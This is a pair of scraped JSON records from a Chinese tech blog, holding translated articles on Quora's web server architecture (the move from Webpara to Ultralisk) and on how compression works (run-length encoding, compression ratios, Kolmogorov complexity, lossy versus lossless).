{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/08/73516834d333d2a79d72cfc38b225dd4.png"], "title": "揭秘 Quora 的 Web 服务器架构", "fav_nums": 0, "url": "http://blog.jobbole.com/113576/", "create_date": "2018/01/29", "url_object_id": "c3a165a85c1b1642729fbb63e5c98e50", "comment_nums": 0, "front_image_path": "full/c8b802de5bdc21490e5a2a7e1882a02e3bf9b939.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/PassWarer\">10111000</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://engineering.quora.com/Web-Server-Architecture-at-Quora\">engineering.quora</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【导读】：Quora 曾经在 2012 年 8 月使用了一种新的并行架构去渲染页面。相比以前， 3-10 倍的速度来渲染页面。如今，我们又对原来的架构设计做了一些改进，从而进一步提高了速度并节省了成本。Quora 工程师在本文和大家一起分享他们是如何改造的。</p>\n<h3>原来的并行架构：Webpara</h3>\n<p>原来的并行架构设计服从主从模式，它的设计和参数是在生产环境中经过一系列基准测试后选定的。该设计中的主结点和从结点在不同的层级里：主结点机器我们称之为 webpara，每个结点上跑有 6 个主进程；从结点机器我们称之为 webworker，每个结点上有 6 个工作进程和一个用 C++ 语言编写的 fastrouter 进程。主进程和工作进程中的应用逻辑跑在相同的 web 服务器中，fastrouter 进程则是跑在一个用 C++ 定制的多线程队列服务器中，支持任意数据的快速入队和出队。这两层都是使用了AWS的 c1.xlarge EC2 实例，它们有 8 核和 6MB 的共享 CPU 高速缓存。<br>\n<a href=\"http://jbcdn2.b0.upaiyun.com/2015/08/089385ecfe9ad6d5a8a03cc3b88745dd.jpeg\"><img class=\"alignnone size-full wp-image-67144\" src=\"http://jbcdn2.b0.upaiyun.com/2015/08/089385ecfe9ad6d5a8a03cc3b88745dd.jpeg\" alt=\"Webpara Architecture\" width=\"605\" height=\"452\"></a></p>\n<p>一个来自负载均衡器的请求会被分配给某个 webpara 机器中的空闲主进程，这个进程会先完成一部分的页面渲染工作，然后再把剩余的工作作为子请求通过工作结点机器上的快速路由分发给对应的工作进程。每个工作进程可以完成子请求需要的所有响应，或者是准备一部分响应并进一步将工作分配给别的工作进程，甚至是不同机器上的工作进程。最终，由原始的主进程把工作进程返回的所有子响应合并，并对客户的页面请求发出响应。因为这种分治的思想，使得我们有能力在许多不同的工作机器上并行的工作，从而快速的进行页面渲染。</p>\n<p>不过，因为工作进程和主进程是在不同的机器上，所以所有的通信都依赖于网络。每个子请求和子响应都需要作为有效载荷在我们的 EC2 环境里跨机器进行传输。2012 年 12 月左右，我们开始面临一些规模扩展问题，尽管我们使用了这种并行的架构设计，但对于Quora的访问依然慢了下来。</p>\n<p>我们的网络流量已经增长到足以挑战这种设计的极限 — 即使增加主结点机器和从结点机器，也依然不能很好改变这种情况。而像 Memcached 和 Redis 这样的外部服务调用也会随着时间的推移变得越来越慢。随后，我们意识到，我们的瓶颈在于网络 I/O 而不是 CPU。太多的网络调用导致了大量的上下文切换。</p>\n<p>因此，我们不得不找到一种方法去减少网络容量和网络调用的数量，而所有的这些都不能影响到 CPU 的执行效率或是增加成本。为了达到这个目标，我们重新安排了架构的各个部分，通过几次A / B测试收集了详细的指标，并选择了可能实现这些目标的最佳配置。由此产生的架构就是我们所说的 Ultralisk。[1]</p>\n<h3>新的并行架构：Ultralisk</h3>\n<p>这种新的 Ultralisk 架构是由同一种机器类型组成 — EC2 的 cc2.8xlarge 实例，这种类型的机器在硬件虚拟化这一方面会更有效率（与其他的 EC2 实例类型相比）。另外，这些机器有着很高的网络I/O容量。</p>\n<p>这个架构仍然与之前的架构一样采用主从模式。Ultralisk 架构主要的改进在于其中的每台物理机器同时拥有主进程和工作进程。所有由主进程生成的子请求都将交给同一台机器上的工作进程处理。因此，主进程和工作进程之间的通信不再依赖于外部网络。因为我们这种类型的通信是并行架构中的其他网络流量的 1.5 倍，所以这种变化使我们的外部网络流量减少了超过 60% 。主进程和工作进程之前的通信可以很简单的基于 TCP 连接或者 Unix 套接字实现。在我们的实验中，这两种实现方式的性能很接近，Unix套接字只是稍快一些。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2015/08/2c55cc1aa1f2aee7a363cc37f88ac0ea.jpeg\"><img class=\"alignnone size-full wp-image-67148\" src=\"http://jbcdn2.b0.upaiyun.com/2015/08/2c55cc1aa1f2aee7a363cc37f88ac0ea.jpeg\" alt=\"Ultralisk_arch\" width=\"602\" height=\"452\"></a></p>\n<p>每台物理机器上主进程和工作进程的个数是整体性能的关键。如果工作进程太少，我们就不能很好的利用并行从而导致系统变慢；如果工作进程太多，会导致太多的上下文切换。同样，在决定主进程的个数时，则需要在成本和速度之间进一步权衡。经过我们的实验，我们发现一个优化的配置是在每台物理机器上跑 6 个主进程，27 个工作进程和 1 个快速路由。CPU 的亲和性设置可以使得每个工作进程和快速路由进程跑在固定的 CPU 内核上。两个主进程共享一个核（因此 6 个主进程需要占用 3 个内核），剩下的核留给系统的内核进程，包括处理所有的 I/O中断，但并不仅限于此。[2]</p>\n<p>这种架构减少了网络 I/O 数量和 I/O 资源的占用，从而使得外部服务的调用变得更快。下图给出了在 Memcached 调用时请求响应时间（毫秒）在 99% 分位处的改进。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2015/08/31d0d1236e6d7ce91262929987656760.png\"><img class=\"alignnone size-full wp-image-67146\" src=\"http://jbcdn2.b0.upaiyun.com/2015/08/31d0d1236e6d7ce91262929987656760.png\" alt=\"effect_on_network_calls\" width=\"500\" height=\"300\"></a></p>\n<p>总体来看，新的架构比之前的要快上 20-35%。下图给出了两种架构体系中请求响应时间在中位数与 90% 分位处的比率。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2015/08/b1a2fadde397e18777aa45ac94f34260.png\"><img class=\"alignnone size-full wp-image-67147\" src=\"http://jbcdn2.b0.upaiyun.com/2015/08/b1a2fadde397e18777aa45ac94f34260.png\" alt=\"effect_on_overall\" width=\"500\" height=\"300\"></a></p>\n<p>总而言之，Ultralisk 架构更快，更便宜，对网络资源的占用更少，而且比我们之前的 Webpara 架构更有扩展性。另外，现在每台机器都是相同的配置，完全与其他所有的机器独立，而我们也精确的知道每台机器每秒可以处理多少请求，所以我们可以以自动的方式来水平扩展我们的 Web 服务器。此外，这种新架构将我们需要管理的机器数量减少为原来的四分之一，从而可以更轻松的管理和部署。</p>\n<p>我们在二月份已经把这种新架构完全部署到了生产环境，尽管我们的网络流量呈指数级增长，但目前还没有看到任何问题。一如既往，性能对我们至关重要，我们的速度和基础架构团队致力于让Quora给你更好的体验。</p>\n<p>（作者 Nikhil Garg 是一名 Quora 工程师，并供职于速度团队）</p>\n<p><strong>补注：</strong></p>\n<ul>\n<li>[1] Ultralisk 是虫族最大和最强力的地面部队之一。它们非常昂贵。它们的基因物质已经经过无数次的测试和实验，而最后的可行版本只能用于虫族的幼虫。</li>\n<li>[2] CPU 亲和性的正确设置是性能收益的关键。从那以后，我们也开始在不同层次的机器上设置 CPU 亲和性，而这样也确实带来了一定的收益。</li>\n</ul>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113576\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113576votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113576\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/PassWarer\">10111000</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/PassWarer\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/7d7861d88112f0f68c90a9d44028a243.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            Web开发为主，熟悉Python,Java。爱好英语,安全相关。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/PassWarer\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/passwarer/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/PassWarer/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 10</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://10111000.com\"><i class=\"fa fa-link\"></i></a> <a title=\"个人微信：Leo_Kris\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a> <a title=\"GitHub主页\" target=\"_blank\" href=\"https://github.com/PassWarer\"><i class=\"fa fa-github\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/b9ef8d0caa5ba5128d42f1ab6956e047.jpeg"], "title": "可视化解释压缩算法的工作原理", "fav_nums": 1, "url": "http://blog.jobbole.com/113505/", "create_date": "2018/01/22", "url_object_id": "b9b171295ec64f98fee2fb5b2e84e1b9", "comment_nums": 1, "front_image_path": "full/78e713b8eb8fef3bd02c3d3719902b1ba8c74965.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/2018329974\">nEoYe</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://unwttng.com/compression-decompressed\">unwttng</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>压缩技术在生活中无处不在，硬盘上存储数据、发送电视信号、网页传输、流媒体、电子游戏……现代计算几乎没有一个重要领域不使用压缩技术。</p>\n<h3>那么压缩技术到底是什么？</h3>\n<p>无论你使用过很多年的电脑压缩软件还是从没想过这个问题，本文将尝试解释，当你压缩一个文件或传输一段视频时，其中的数据到底发生了什么变化。我们将探寻这些重要问题的答案，在此过程中，也许会提出一些新的问题。</p>\n<ul>\n<li>对被压缩对象进行压缩，意味着什么？</li>\n<li>如何能将目标对象变得比原来更小？</li>\n<li>如何具体实现压缩技术</li>\n</ul>\n<p>让我们来一一解答吧！</p>\n<p><iframe width=\"480\" height=\"480\" src=\"https://giphy.com/embed/l0Iy1ZcHArR9aAQta\" frameborder=\"0\" class=\"giphy-embed\" allowfullscreen=\"allowfullscreen\"></iframe></p>\n<p><a href=\"https://giphy.com/gifs/twitter-reaction-happy-l0Iy1ZcHArR9aAQta\">via GIPHY</a></p>\n<h3>基础知识</h3>\n<p>在研究压缩技术和数字信息之前，这里有一段通俗易懂的压缩技术介绍。让我们来看看下方的英文字母：</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fnph6hij8kj203j01xa9t.jpg\" width=\"127\" height=\"69\"></p>\n<p>看看我们用来表现这个单词（Tree）的字符，加起来一共是 4 个：</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fnph6hij8kj203j01xa9t.jpg\" width=\"127\" height=\"69\"></p>\n<p>看起来还行。如果我们用汉字会发生什么？</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fnph6i6zpej202o01t0rs.jpg\" width=\"96\" height=\"65\"></p>\n<p>天哪！只用了一个字符！我们有改变它要传达的意思和任何信息么？并没有。但是，我们降低了75%的网页空间，来表达“tree”的含义。那么我们到底做了什么？</p>\n<p>没什么神奇的 —— 我们只是用另一种方式去表达了这个含义。我们选择了一种不同的、更加高效的信息表现方式。Spoiler：接下来是本文最重要的部分，请仔细阅读。</p>\n<p><strong>那么，如果是像素级的图片呢？</strong></p>\n<p>你肯定会觉得惊讶，如何将上面的例子应用于严谨的数字图像数据呢？让我们来看一下最近很流行的一类数据 —— 图片。现阶段，让我们先从简单的像素级图片入手，而不是一上来就尝试去压缩一张高分辨率的 Instagram 图片或其他类似的复杂图片。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fnph4do8wyj208u08u741.jpg\" width=\"318\" height=\"318\"></p>\n<p>不怎么好看对吗？因为这是我自己画的。上面是一个 10*10 的网格，每一种颜色都可以用‘B’、‘Y’和‘G’中的一个字符来表示。</p>\n<p>我们怎么用数字化的方式表示上面的图像？以原始的方式存储这张图片的文件可能包含下面的内容：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1fnph9vfgjlj20be04oglm.jpg\" width=\"410\" height=\"168\"></p>\n<p>我们所做的只是从左到右，从上到下，为每个像素写下了代表其颜色的字符。正如你预期的那样，总共会有 100 个字符。我们假设这 100 个字符会占用硬盘上的 100 个字节。这种存储方式，定义了一个合理的存储文件大小上限。任何其他存储方式，只要其文件大小大于上述方法，都是无意义的，或者尝试去存储除了图片数据之外的信息（比如元数据或其他数据）。我想你们应该能认同我的这种观点。</p>\n<p>在你往下看之前，开动下你的大脑。如果我让你用少于 100 个字符来表示这张图片，你会怎么做呢？喝一杯茶，仔细想一想，我等着你。</p>\n<p>想到什么方法了吗？很好，我也想到了一个。</p>\n<p>我准备将我的方法命名为<strong>行程长度压缩算法（RLE）</strong>。开玩笑的啦，这个方法不是我想出来的，也不是我命名的。至少从六十年代起，它已经成为了一种基本的压缩技术。我打赌，你们之中有些人刚刚才想出这种方法。</p>\n<p>我们将行程长度压缩算法应用于上面的图片。在上方，我们写了很多一连串的相同颜色字符。让我们从那些‘B’字符下手。那么我们能够压缩这些重复的字符么？</p>\n<p>当然可以！抛弃下面这种方式：</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fnph46yjm4j20ew020mwz.jpg\" width=\"536\" height=\"72\"></p>\n<p>取而代之：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1fnph47f2qfj203p01wgld.jpg\" width=\"133\" height=\"68\"></p>\n<p>看起来有戏。通过缩写这一长串相同字符，我们将 17 个字符减少到了 3 个。顺便说下，我们将这些重复的字符串称之为 <strong>runs</strong>。所以<strong>行程长度压缩算法</strong>是通过记下 <strong>runs</strong> 的长度，而不是记下每一个字符，对数据进行压缩编码。这种压缩方式并没有信息丢失。能够解析前一个文件的程序，稍微修改下，就能解析我们的新文件格式。2 者解析出来的图片应该是一样的。</p>\n<p>下面的实时 demo 展示了原始图像和它的 2 种存储编码方式：原始版本和行程长度压缩编码版。</p>\n<p>通过点击任意像素点，你可以改变其颜色，下方的存储字符也会随之变化。</p>\n<blockquote><p><span style=\"color: red;\">编注：英文原文此处有 Demo，本文无法再现，请在 https://unwttng.com/compression-decompressed 查看。</span></p></blockquote>\n<p>随着你不断改变原始图像的像素颜色，你会发现我们能够压缩的比例和图片本身有关。如果整张图片只有一种颜色，或者颜色的连续区域很长，我们可以得到很小的输出。使用行程长度压缩算法能够得到的最小存储大小是 4 字节：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1fnph4913l4j20hu0hu0sj.jpg\" width=\"642\" height=\"642\"></p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fnph49g1fpj204o02h0si.jpg\" width=\"168\" height=\"89\"></p>\n<p>当然，这个算法在某些场景下也会表现的十分糟糕。实际上，用这个算法压缩出来的文件，可以比原始一个像素一个像素表示的方式都要大。你会发现，当需要表示‘1B’或’1G’时，它会使用 2 个字符。如果在你的像素图片中，每个颜色的连续长度只有 1 ，会发生什么？</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fnph49s48fj20jv0jwq2r.jpg\" width=\"690\" height=\"691\"></p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fnph4a84rcj20j602ua9v.jpg\" width=\"690\" height=\"102\"></p>\n<p>惊讶吧。</p>\n<p>是时候学习些术语了。</p>\n<h3>压缩率</h3>\n<p>如何衡量我们的压缩算法到底使数据缩小了多少？你可能已经猜到了 —— 计算数据压缩前后的大小比。</p>\n<p>比如，我们使用算法将 100 字节的像素图片压缩至 42 字节，那么我们计算出的压缩率为 (100 / 42) ≈ 2.38。最好的情况是只有一种颜色的图片，这种算法的压缩率高达 (100 / 4) = 25！然而，当该算法作用于每个颜色的连续长度只有 1 的图片上时，压缩率只有 (100 / 200) = 0.5。Protip：压缩率小于 1 简直是糟糕透了。</p>\n<p>我们可以看出，这种基础 RLE 算法的压缩率对于输入的数据结构十分敏感。对于这类简单的算法，这种现象很常见。该算法对于数据的结构做了若干假设，如果要使该算法能够输出理想结果，原始输入数据中必须存在重复相邻的相同字节。一个更智能的 RLE 算法实现可能会尝试使用重复的子串来对数据进行压缩编码。</p>\n<p>甚至我直接用英语文字描述这张图片，压缩率都比 2 要大！运用这种方法，可以将数据压缩存储成一种友好、简洁的文件格式，相比第一次尝试我们又迈出了一小步。</p>\n<h2>数据到底能被压缩到多小？</h2>\n<p>这是一个很大很宽泛的问题。当然，人们认为，对于任何输入数据，一个合理设计的压缩算法，应该至少能将数据压缩那么一点（这里的一点点，既指口语上的，也表示学术上的）。</p>\n<p>不幸的是，事情并没有那么简单。假设我们有一个算法 A，对于任何的输入，能够使压缩率始终严格大于 1。对于某些输入，压缩率可以为 2.5；对于另一些输入，压缩率可能为 1.000000002。</p>\n<p>如果这种算法存在，我们可以无限迭代调用它。对于某个输入，我们计算 A(A(A(data)))，对每一次的输出不断调用 A()。我们每调用一次，数据的大小至少会被压缩一点点。不难看出，到最后，我们能将数据压缩至 1 字节，甚至 0 字节？</p>\n<p>这看起来不太现实。事实也确实如此。我们甚至不需要使用递归法去证明该算法的可行性，试想下这种情况：有 9 个不同的文件，没有任何方法能够在不丢失数据的情况下，将这 9 个文件都压缩至 3 字节。</p>\n<p>3 个字节一共只能表示 8 种不同的数据：000、001、010、100、011、101、110、111。即使我们有某个十分强大的压缩算法，能够将前 8 个文件分别压缩成前面这 8 种字节表示，第 9 个文件也只能压缩为其中之一。对于该算法，任意 8 个以上的未压缩数据片段，都无法找到更多不同的 3 个字节来表示。</p>\n<p>这里有一条重要的原则：<strong>对常见数据的压缩，任何算法的压缩率都有严格的限制</strong>。你可以不断地使用某个算法对数据进行压缩，直到无法将数据压缩得更小，然后换种算法继续尝试。这种做法也许会将数据压缩得更小（实际上，很多线上的软件都是这么做的），但最终，你会遇到你永远无法再次压缩的数据。其实，你对不同的算法的重复调用，到头来又变成了另一种压缩算法。这条规则现在仍然适用。</p>\n<h3>柯氏复杂性</h3>\n<p>看到下面你也许会更加失望。对于压缩率的大小，不仅仅在算法上有着理论的限制 —— 数据本身的复杂度对其也会有很大的影响</p>\n<p>让我们来看下下面的 2 个字符串：</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fnph4ay4q1j20c70140si.jpg\" width=\"439\" height=\"40\"></p>\n<p>和：</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fnph4bbd5cj20ci0170sk.jpg\" width=\"450\" height=\"43\"></p>\n<p>2 者是完全相同的长度，但是，你可以很轻易地看出来，后者明显要更加复杂。说的更具体点，使用 RLE 压缩算法，我们可以将第一个字符串压缩至最多 3 个字符（“24a”）。</p>\n<p><a href=\"https://wikipedia.org/wiki/Kolmogorov_complexity\">柯氏复杂性</a>（一位苏联数学家 <a href=\"https://en.wikipedia.org/wiki/Andrey_Kolmogorov\">Andrey Nikolaevich Kolmogorov</a> 的伟大发明）将上述内容阐述地很好。当然，一个事物的度量方式有很多种，柯氏复杂性是一种比较不错的度量方式。<strong>数据的柯氏复杂性是指，通过计算机程序输出的，能够描述这个字符串的最短长度</strong>。</p>\n<p>显然，对于柯氏复杂性，任何字符串‘S’的长度上界就是其本身。上述说法将算法进行了一定的简化，其实数据的柯氏复杂性还需加上整个程序的长度 —— 包括解释器或编译后的代码。但是就本文讨论的范围来说，没有必要。直接把它认为是你能生成的该数据的最短长度。</p>\n<p>柯氏复杂性对于你选择什么编程语言并不是很敏感。程序语言的选择只会对复杂度的一个常数因子产生影响。下面这句话很重要：<strong>无论你选择什么语言来描述数据，所带来的长度变化是有限的</strong>。有些数据就是需要比一百万个绿色像素点更多的空间来表示，怎么也减少不了。</p>\n<h2>数据丢失</h2>\n<p>但是，别放弃希望。我们之前讨论的都是<strong>无损压缩</strong>。无损压缩是指，<strong>通过压缩之后的数据，能够完全还原压缩之前的原始数据</strong>。也就是说，如果 C 是我们的压缩算法，D 是相应的解压缩算法，<span style=\"color: #ff0000;\">D(C(x)) = x 对于任何输入数据 x 永远成立</span>。</p>\n<p>无损压缩是十分有用的！当压缩一些文献或博文、税收档案、低分辨率的像素图片等类似的文本数据时，你肯定想要做到无损压缩。对于这些数据，保证数据的精确和每个字符的顺序，是很重要的。</p>\n<p>但是也有其他选择。有损压缩是指，不保证压缩的数据解压之后与压缩之前的数据完全一致。这种压缩算法十分常见。</p>\n<p>有损压缩应用十分广泛。人类的感官对于一些微小错误或瑕疵是比较有容忍度的。数据丢失主要体现在压缩图片、音频（或视频）文件时。</p>\n<p>需要例子吗？请看下面 2 张奥巴马的图片。</p>\n<div class=\"_3Ubq9VOb1UrxcVCNkyeHvy\" data-reactid=\"2170\"><img class=\"_2KvafgTG8gHR5gjd_JB3mD\" src=\"https://unwttng.com/i/barack.png?v=v8.3.0\" data-reactid=\"2171\"></div>\n<div class=\"_3Ubq9VOb1UrxcVCNkyeHvy\" data-reactid=\"2170\">第一张图片是大小约为 335 千字节的 PNG 文件（PNG 是一种无损图片压缩格式）。这将作为我们的参照物。</div>\n<div class=\"_3Ubq9VOb1UrxcVCNkyeHvy\" data-reactid=\"2170\"></div>\n<div class=\"_3Ubq9VOb1UrxcVCNkyeHvy\" data-reactid=\"2172\"><img class=\"_2KvafgTG8gHR5gjd_JB3mD\" src=\"https://unwttng.com/i/barack.jpg?v=v8.3.0\" data-reactid=\"2173\"></div>\n<p>第二张图片，是第一张图片保存为 JPEG 格式的结果，这是一种会丢失许多数据的有损压缩。第二张图片的大小约为 22 千字节，相比原始图片，压缩率约为 15，这么大的压缩率并不表示数据丢失会很严重。</p>\n<p>你能看出这 2 张图片的区别么？也许能看出一点点。如果你尽可能靠近你的屏幕，眯起眼睛，转头环视下这张图片。接着你去看他的头发细节，一根一根地数头发，在没有头发的地方你会发现一些模糊。关键点不在于第二张图是不是一个完美的复制品，而在于它是不是足够好用。当你通过互联网传输数据时，十五倍的压缩率比起一张毫无损失的 PNG 图片更有价值。</p>\n<p>但这并不是说在任何情况下，它都如此出色。为了达到这种压缩效果，JPEG 必须丢掉很多数据，尽管同时它尽力避免丢失太多数据，但是你可以尝试探索下它的极限。通过下面的实时 demo，你可以看出 JPEG 格式的图片质量下限能到多少。同时在图片清晰度变得无法容忍之前，注意看下图片质量是多少。像我之前说的那样，人类的视觉容忍度是很高的。</p>\n<blockquote><p><span style=\"color: #ff0000;\">编注：英文原文此处有一个 Demo，本文无法再现，请在 https://unwttng.com/compression-decompressed 查看</span></p></blockquote>\n<p>像 Netflix 和 YouTube 上的视频流服务，以及 Spotify 和 Soundcloud 上的音频流服务，都是使用的有损压缩。缓冲或延迟是一个用户无法忍受的，所以在保证音视频质量的同时，这些服务尽可能地去压缩数据。你经常会看到数据的动态压缩， 一开始视频会比较模糊，当检测到你的网络速度可以接受更小的压缩率时，视频的清晰度会随之提高。</p>\n<p>看到下面这张来自 Giphy 网站上的动图了么？数据的动态压缩在这里同样适用。看看他们是如何处理网速慢的情况下的动图加载（没错，我在 Giphy 网站上将这个加载过程做成了一张动图，并将它嵌入了进来，看出什么问题了么？）：</p>\n<p><iframe width=\"480\" height=\"377\" src=\"https://giphy.com/embed/l1J3QaZoHeNZ9JFU4\" frameborder=\"0\" class=\"giphy-embed\" allowfullscreen=\"allowfullscreen\"></iframe></p>\n<p>（<a href=\"https://giphy.com/gifs/l1J3QaZoHeNZ9JFU4\">via GIPHY</a>）</p>\n<p>看起来很奇怪对么？首先，他们加载了这张动图的第一帧低清晰度图片。接着，当更大的数据传输过来后，出现了动图。但是还不完全，只有仅仅几帧。然后，越来越多帧图片被传输了过来，直到最后完全加载整张动图。</p>\n<p>这就是现代的流媒体压缩技术：混合的压缩策略几乎完全是为了，以尽可能少的字节（大小越小，时间也越短），提供给用户流畅的内容。针对文件的无损压缩技术，比如上面说到的 RLE，也有用武之地，而且它仍然是很多最好的桌面文件压缩工具的核心模块。但是，多亏了有损压缩，你才能在电视上流畅地观看《权利的游戏》。</p>\n<h2>数据压缩无处不在</h2>\n<p>关于压缩技术本文我们就先介绍到这里，但这只是冰山一角。</p>\n<p>我们学习了压缩技术的基本思想，从这些技术中得出了一条很重要的哲学道理：</p>\n<p><strong>图像，文字，视频，音乐 —— 任何数据都没有唯一正确的表现形式。区别只是在于有多少种表现数据的有效方式。</strong></p>\n<p>压缩技术就是不断寻找更加有效的方式来存储你的数据，最强大的压缩算法，对于任何数据，它都能找到一种高效的方法对其进行压缩。</p>\n<p>感谢阅读，如果你认可我在文中制作的那些实时 demo，请随时与你的朋友分享。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113505\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113505votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113505\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/2018329974\">nEoYe</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/2018329974\">\r\n\t\t\t<img src=\"http://tp4.sinaimg.cn/2018329974/180/0/1\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            喜欢唱歌和游戏的程序员        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/2018329974\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/2018329974/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/2018329974/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://neoyeelf.github.io\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/2018329974\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "2"}
